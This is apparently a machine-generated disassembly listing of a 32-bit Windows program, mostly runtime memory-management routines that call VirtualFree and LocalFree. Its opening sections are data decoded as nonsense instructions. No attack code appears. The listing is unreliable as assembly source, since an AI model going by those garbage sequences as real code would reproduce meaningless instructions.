sub_401092
call [ eax + r-xdata ]
or al [ esi ]
push ebx
je r-xdata
arpl [ esp + edi * 8 + 0x10 ] si
imul ebp [ esi + 0x67 ] r-xdata
or al 0x7
push esi
popad
jb r-xdata
add [ eax ] al
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
popad
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add al dh
xor al 0x40
add [ ecx + ebx * 2 + 0x59c00040 ] dh
inc eax
add [ esi + 0x34f80040 ] al
inc eax
add al dl
pop ecx
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x11004032 ] bl
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
insd
add [ eax ] al
sub [ ecx ] dl
inc eax
add [ edi ] cl
or cl [ ecx + 0x49 ]
outsb
je r-xdata
nop
inc eax
adc [ eax ] al
add [ edi ] eax
dec ecx
outsb
je r-xdata
inc eax
add ah bh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
sar bh 0x25
jb r-xdata
inc esi
jne r-xdata
jb r-xdata
outsb
je r-xdata
jb r-xdata
mov ah 0x61
dec ecx
add [ ebx - 0x4fda0040 ] cl
popad
dec ecx
add [ ebx - 0x53da0040 ] cl
popad
dec ecx
add [ ebx - 0x57da0040 ] cl
popad
dec ecx
add [ ebx - 0x5bda0040 ] cl
popad
dec ecx
add [ ebx - 0x5fda0040 ] cl
popad
dec ecx
add [ ebx - 0x63da0040 ] cl
popad
dec ecx
add [ ebx - 0x67da0040 ] cl
popad
dec ecx
add [ ebx - 0x1bda0040 ] cl
popad
dec ecx
add [ ebx - 0x6bda0040 ] cl
popad
dec ecx
add [ ebx - 0x6fda0040 ] cl
popad
dec ecx
add [ ebx - 0x73da0040 ] cl
popad
dec ecx
add [ ebx - 0x3da0040 ] cl
popad
dec ecx
add [ ebx - 0x7da0040 ] cl
popad
dec ecx
add [ ebx - 0xbda0040 ] cl
popad
dec ecx
add [ ebx - 0x77da0040 ] cl
popad
dec ecx
add [ ebx - 0x7bda0040 ] cl
popad
dec ecx
add [ ebx + 0xc25ffc0 ] cl
bound ecx [ ecx ]
mov eax eax
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
pop eax
adc [ eax ] al
add [ edx + eax * 2 ] eax
jns r-xdata
add [ eax ] al
add [ eax ] al
[ eax ] eax
je r-xdata
adc [ eax ] al
add al 0x0
add [ gs : eax ] eax
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add [ edi + edx * 2 ] eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ eax + r-xdata ] dl
add [ eax ] ecx
inc ebx
popad
jb r-xdata
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x7004032 ] bl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x11 ] si
inc eax
add [ edi ] al
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
imul ebp [ esi + 0x61 ] 0x56c
add [ eax ] al
sub_401153
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40335c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401175
push ebp
adc [ eax ] eax
pop edi
adc [ eax ] eax
imul edx [ ecx ] 0x10040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
jne r-xdata
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
[ eax ] eax
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add al dh
xor al 0x40
add [ ecx + ebx * 2 + 0x59c00040 ] dh
inc eax
add [ esi + 0x34f80040 ] al
inc eax
add al dl
pop ecx
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x11004032 ] bl
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
sar bh 0x25
jb r-xdata
mov ah 0x61
dec ecx
add [ ebx - 0x4fda0040 ] cl
popad
dec ecx
add [ ebx - 0x53da0040 ] cl
popad
dec ecx
add [ ebx - 0x57da0040 ] cl
popad
dec ecx
add [ ebx - 0x5bda0040 ] cl
popad
dec ecx
add [ ebx - 0x5fda0040 ] cl
popad
dec ecx
add [ ebx - 0x63da0040 ] cl
popad
dec ecx
add [ ebx - 0x67da0040 ] cl
popad
dec ecx
add [ ebx - 0x1bda0040 ] cl
popad
dec ecx
add [ ebx - 0x6bda0040 ] cl
popad
dec ecx
add [ ebx - 0x6fda0040 ] cl
popad
dec ecx
add [ ebx - 0x73da0040 ] cl
popad
dec ecx
add [ ebx - 0x3da0040 ] cl
popad
dec ecx
add [ ebx - 0x7da0040 ] cl
popad
dec ecx
add [ ebx - 0xbda0040 ] cl
popad
dec ecx
add [ ebx - 0x77da0040 ] cl
popad
dec ecx
add [ ebx - 0x7bda0040 ] cl
popad
dec ecx
add [ ebx + 0xc25ffc0 ] cl
bound ecx [ ecx ]
mov eax eax
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401380
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401340
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013d8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401380
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401420
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401408
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401408
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013d8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401490
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013d8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401408
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401524
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013d8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401350
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401588
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401350
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401350
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013d8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401600
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401408
mov [ rw-data ] 0x1
sub_4016b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401350
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40174c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401524
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016b8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401420
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401600
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401408
jmp r-xdata
sub_40185c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401588
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401420
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401588
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401600
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401420
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016b8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401600
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401408
jmp r-xdata
sub_401980
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40174c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401420
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401600
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401490
jmp r-xdata
sub_401a0c
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ac2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401360
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
push 0xff8
push 0x0
call sub_401340
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ac9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401370
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ad0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401ba6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401368
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401378
retn
push rw-data
call sub_401370
sub_401bb0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c14
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c44
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e18
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401c98
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c74
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cc0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401bb0
add ebx esi
mov [ rw-data ] 0x6
sub_401d30
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401bb0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d68
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c14
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401980
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401980
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c44
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401490
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401c98
sub_401e18
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d68
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401ea0
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c74
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401eec
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401ea0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401420
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cc0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d30
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c44
sub [ edi + 0x4 ] 0x4
sub_401f78
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017cc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401eec
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401fa4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40185c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401eec
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401fd8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_402004
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401bb0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e18
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
